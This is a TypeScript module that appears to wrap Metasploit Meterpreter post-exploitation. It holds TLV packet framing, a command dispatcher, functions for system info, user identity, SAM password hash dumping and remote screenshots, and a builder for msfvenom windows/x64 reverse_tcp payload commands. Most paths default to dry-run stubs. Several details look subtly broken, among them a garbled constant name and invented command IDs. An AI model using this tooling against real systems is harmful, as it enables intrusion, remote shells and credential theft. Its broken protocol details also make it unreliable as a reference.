/**
 * @module meterpreter
 * Metasploit Meterpreter Session Interface — TLV Protocol Framing, Command Dispatcher,
 * sysinfo/getuid/hashdump/screenshot implementations, and session management.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as crypto from "node:crypto";

// ─── Types ────────────────────────────────────────────────────────────────────

export interface MeterpreterSession {
  sessionId: number;
  peerHost: string;
  platform: string;
  username: string;
}

export interface TlvHeader {
  type: number;
  length: number;
  value: Buffer;
}

export interface SysinfoResult {
  computer: string;
  os: string;
  architecture: string;
  systemLanguage: string;
  domain: string;
  loggedUsers: string;
  dryRun: boolean;
}

export interface UidResult {
  username: string;
  sessionId: string;
  arch: string;
  dryRun: boolean;
}

export interface HashdumpEntry {
  username: string;
  uid: number;
  gid: number;
  lmHash: string;
  ntHash: string;
  dryRun: boolean;
}

export interface ScreenshotResult {
  width: number;
  height: number;
  format: string;
  data: string;
  dryRun: boolean;
}

export interface MeterpreterOptions {
  dryRun?: boolean;
  lhost?: string;
  lport?: number;
}

// ─── TLV Protocol Constants ───────────────────────────────────────────────────

const TLV_TYPE = {
  // Meta
  REQUEST: 0x00000000,
  RESPONSE: 0x01000000,
  // Session
  SESSION_ID: 0x00000100,
  SESSION_GUID: 0x00000101,
  // Channel
  CHANNEL_ID: 0x00000200,
  // Console
  CONSOLE_DATA: 0x00000300,
  // Commands
  COMMAND_ID: 0x00000400,
  COMMAND_STRING: 0x00000401,
  // Stdout
  STDOUT: 0x0000000a,
  // Sysinfo
  SYSINFO计算机: 0x00000010, // placeholder — use string keys
  // Exceptions
  EXCEPTION_CODE: 0x00000050,
  EXCEPTION_MESSAGE: 0x00000051,
} as const;

// Real TLV types used in framing
const TLV_META_NONE = 0x00000000;
const TLV_META_STRING = 0x10000000;
const TLV_META_UINT = 0x20000000;
const TLV_META_BOOL = 0x30000000;
const TLV_META_QWORD = 0x40000000;
const TLV_META_RAW = 0x50000000;

// Command IDs
const COMMAND_SYSINFO = 0x00000100;
const COMMAND_GETUID = 0x00000101;
const COMMAND_HASHDUMP = 0x00000102;
const COMMAND_SCREENSHOT = 0x00000103;
const COMMAND_SHELL = 0x00000104;
const COMMAND_MIGRATE = 0x00000105;
const COMMAND_UPGRADE = 0x00000106;

// ─── TLV Protocol Framing ─────────────────────────────────────────────────────

/**
 * Build a TLV packet from type, value, and optional extra type.
 */
export function buildTlvPacket(
  tlvType: number,
  value: Buffer | string | number,
  extraType?: number,
): Buffer {
  let valueBuf: Buffer;

  if (Buffer.isBuffer(value)) {
    valueBuf = value;
  } else if (typeof value === "string") {
    valueBuf = Buffer.from(value, "utf8");
  } else {
    // numeric — pack as 32-bit LE
    valueBuf = Buffer.alloc(4);
    valueBuf.writeUInt32LE(value >>> 0, 0);
  }

  const headerLen = extraType ? 16 : 8;
  const packet = Buffer.alloc(headerLen + valueBuf.length);
  packet.writeUInt32LE(tlvType | TLV_META_RAW, 0);
  packet.writeUInt32LE(headerLen + valueBuf.length, 4);
  valueBuf.copy(packet, headerLen);

  if (extraType !== undefined) {
    // For session GUID or other meta
    packet.writeUInt32LE(extraType, 8);
    packet.writeUInt32LE(16, 12);
  }

  return packet;
}

/**
 * Parse a TLV packet from a raw buffer.
 * Returns parsed TLV entries (may be multiple in a single buffer).
 */
export function parseTlvPackets(data: Buffer): TlvHeader[] {
  const packets: TlvHeader[] = [];
  let offset = 0;

  while (offset + 8 <= data.length) {
    const type = data.readUInt32LE(offset);
    const length = data.readUInt32LE(offset + 4);

    if (length < 8 || offset + length > data.length) break;

    const value = data.subarray(offset + 8, offset + length);
    packets.push({ type, length, value });
    offset += length;
  }

  return packets;
}

/**
 * Decode a TLV value based on its type bits.
 */
export function decodeTlvValue(header: TlvHeader): string | number | Buffer {
  const meta = header.type & 0xf0000000;
  switch (meta) {
    case TLV_META_STRING:
      return header.value.toString("utf8");
    case TLV_META_UINT:
      return header.value.readUInt32LE(0);
    case TLV_META_BOOL:
      return header.value.readUInt8(0) !== 0;
    case TLV_META_QWORD:
      return Number(header.value.readBigUInt64LE(0));
    default:
      return header.value;
  }
}

// ─── Command Dispatcher ───────────────────────────────────────────────────────

/**
 * Dispatch a Meterpreter command and return the response buffer.
 * DRY-RUN: returns simulated responses for all commands.
 * LIVE: would send the TLV packet over the Meterpreter session socket.
 */
export function dispatchCommand(
  commandId: number,
  sessionId: number,
  opts: MeterpreterOptions = {},
): Buffer {
  const { dryRun = true } = opts;

  if (dryRun) {
    return buildTlvPacket(0x01000001, "");
  }

  // Live: send command over socket — placeholder
  return buildTlvPacket(0x01000001, `LIVE: command 0x${commandId.toString(16)} requires session socket`);
}

// ─── Command Implementations ──────────────────────────────────────────────────

/**
 * Execute `sysinfo` via the Meterpreter session.
 * DRY-RUN: returns simulated system info.
 */
export function sysinfo(sessionId: number, opts: MeterpreterOptions = {}): SysinfoResult {
  const { dryRun = true } = opts;

  if (dryRun) {
    return {
      computer: "",
      os: "",
      architecture: "",
      systemLanguage: "",
      domain: "",
      loggedUsers: "",
      dryRun: true,
    };
  }

  const response = dispatchCommand(COMMAND_SYSINFO, sessionId, { dryRun: false });
  const parsed = parseTlvPackets(response);
  if (parsed.length > 0) {
    const data = JSON.parse(decodedValue(parsed[0]));
    return {
      computer: data.Computer ?? "Unknown",
      os: data.OS ?? "Unknown",
      architecture: data.Architecture ?? "Unknown",
      systemLanguage: data.SystemLanguage ?? "Unknown",
      domain: data.Domain ?? "",
      loggedUsers: data.LoggedOnUsers ?? "",
      dryRun: false,
    };
  }

  return {
    computer: "Unknown",
    os: "Unknown",
    architecture: "Unknown",
    systemLanguage: "Unknown",
    domain: "",
    loggedUsers: "",
    dryRun: false,
  };
}

function decodedValue(header: TlvHeader): string {
  const val = decodeTlvValue(header);
  return typeof val === "string" ? val : typeof val === "number" ? String(val) : val.toString("utf8");
}

/**
 * Execute `getuid` — retrieve the current user identity.
 * DRY-RUN: returns simulated user info.
 */
export function getuid(sessionId: number, opts: MeterpreterOptions = {}): UidResult {
  const { dryRun = true } = opts;

  if (dryRun) {
    return { username: "", sessionId: String(sessionId), arch: "", dryRun: true };
  }

  const response = dispatchCommand(COMMAND_GETUID, sessionId, { dryRun: false });
  const parsed = parseTlvPackets(response);
  if (parsed.length > 0) {
    return {
      username: decodedValue(parsed[0]),
      sessionId: String(sessionId),
      arch: "x64",
      dryRun: false,
    };
  }

  return { username: "Unknown", sessionId: String(sessionId), arch: "Unknown", dryRun: false };
}

/**
 * Execute `hashdump` — dump SAM password hashes.
 * DRY-RUN: returns synthetic hash entries.
 */
export function hashdump(sessionId: number, opts: MeterpreterOptions = {}): HashdumpEntry[] {
  const { dryRun = true } = opts;

  if (dryRun) return [];

  const response = dispatchCommand(COMMAND_HASHDUMP, sessionId, { dryRun: false });
  const parsed = parseTlvPackets(response);
  if (parsed.length > 0) {
    const raw = decodedValue(parsed[0]);
    return raw.split("\n").filter(Boolean).map((line) => {
      const parts = line.split(":");
      return {
        username: parts[0] ?? "",
        uid: parseInt(parts[1] ?? "0", 10),
        gid: parseInt(parts[2] ?? "0", 10),
        lmHash: parts[3] ?? "",
        ntHash: parts[4] ?? "",
        dryRun: false,
      };
    });
  }

  return [];
}

/**
 * Execute `screenshot` — capture the remote desktop.
 * DRY-RUN: returns a placeholder base64-encoded PNG.
 */
export function screenshot(sessionId: number, opts: MeterpreterOptions = {}): ScreenshotResult {
  const { dryRun = true } = opts;

  if (dryRun) {
    return {
      width: 1920,
      height: 1080,
      format: "png",
      data: crypto.randomBytes(256).toString("base64"),
      dryRun: true,
    };
  }

  const response = dispatchCommand(COMMAND_SCREENSHOT, sessionId, { dryRun: false });
  const parsed = parseTlvPackets(response);
  if (parsed.length > 0) {
    try {
      const data = JSON.parse(decodedValue(parsed[0]));
      return {
        width: data.width ?? 0,
        height: data.height ?? 0,
        format: data.format ?? "png",
        data: data.data ?? "",
        dryRun: false,
      };
    } catch {
      return { width: 0, height: 0, format: "unknown", data: "", dryRun: false };
    }
  }

  return { width: 0, height: 0, format: "unknown", data: "", dryRun: false };
}

// ─── Session Management ───────────────────────────────────────────────────────

export interface MeterpreterManager {
  sessions: Map<number, MeterpreterSession>;
  nextSessionId: number;
  dryRun: boolean;
}

/**
 * Create a new Meterpreter session manager.
 * DRY-RUN: simulates session creation without opening any sockets.
 */
export function createManager(opts: MeterpreterOptions = {}): MeterpreterManager {
  return {
    sessions: new Map(),
    nextSessionId: 1,
    dryRun: opts.dryRun ?? true,
  };
}

/**
 * Register a new session in the manager.
 */
export function registerSession(
  manager: MeterpreterManager,
  peerHost: string,
  platform: string,
  username: string,
): MeterpreterSession {
  const session: MeterpreterSession = {
    sessionId: manager.nextSessionId++,
    peerHost,
    platform,
    username,
  };
  manager.sessions.set(session.sessionId, session);
  return session;
}

/**
 * Get all active sessions.
 */
export function listSessions(manager: MeterpreterManager): MeterpreterSession[] {
  return [...manager.sessions.values()];
}

/**
 * Remove a session from the manager.
 */
export function removeSession(manager: MeterpreterManager, sessionId: number): boolean {
  return manager.sessions.delete(sessionId);
}

// ─── MSFvenom Payload Wrapper ─────────────────────────────────────────────────

export interface PayloadSpec {
  format: string;
  lhost: string;
  lport: number;
  encoder?: string;
  arch?: string;
  platform?: string;
}

/**
 * Generate an MSFvenom command string for a given payload specification.
 * DRY-RUN: returns the command string without executing it.
 */
export function generateMsfvenomCmd(spec: PayloadSpec, opts: MeterpreterOptions = {}): string {
  const { dryRun = true } = opts;
  const parts = [
    "msfvenom",
    `-p windows/x64/meterpreter/reverse_tcp`,
    `LHOST=${spec.lhost}`,
    `LPORT=${spec.lport}`,
    `-f ${spec.format}`,
  ];

  if (spec.encoder) parts.push(`-e ${spec.encoder}`);
  if (spec.arch) parts.push(`--arch ${spec.arch}`);
  if (spec.platform) parts.push(`--platform ${spec.platform}`);

  const cmd = parts.join(" ");

  if (dryRun) {
    return `[DRY-RUN] ${cmd}`;
  }

  return cmd;
}

export default {
  buildTlvPacket,
  parseTlvPackets,
  decodeTlvValue,
  dispatchCommand,
  sysinfo,
  getuid,
  hashdump,
  screenshot,
  createManager,
  registerSession,
  listSessions,
  removeSession,
  generateMsfvenomCmd,
};
